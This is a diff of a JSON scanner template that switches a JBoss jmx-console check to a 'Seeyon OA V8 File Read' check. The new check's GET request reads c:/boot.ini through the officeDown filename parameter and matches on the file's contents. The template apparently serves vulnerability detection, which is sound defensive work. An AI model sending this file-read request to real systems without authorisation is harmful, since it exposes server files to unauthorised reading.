@@ -1,13 +1,13 @@
 {
-    "Name": "jboss-unauth",
-    "Description": "jboss-unauth, unauthorized access vulnerability",
-    "Product": "jboss",
+    "Name": "Seeyon OA V8 File Read",
+    "Description": "Seeyon OA V8 File Read",
+    "Product": "Seeyon OA",
     "author": "chumeng",
     "Request":[
         {
         "Method": "GET",
         "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
-        "Uri":"/jmx-console/",
+        "Uri":"/seeyon/main.do?method=officeDown&filename=c:/boot.ini",
         "Port":"",
         "Data":"",
         "Follow_redirects":"false",
@@ -18,12 +18,8 @@
                 {
                 "Operation": "contains", 
                 "Key":"",
-                "Value": "jboss.management.local"
-                }, {
-                    "Operation": "contains", 
-                    "Key":"",
-                    "Value": "jboss.web"
-                    },
+                "Value": "for 16-bit app support"
+                },
                  {
                 "Operation": "code", 
                 "Key":"",
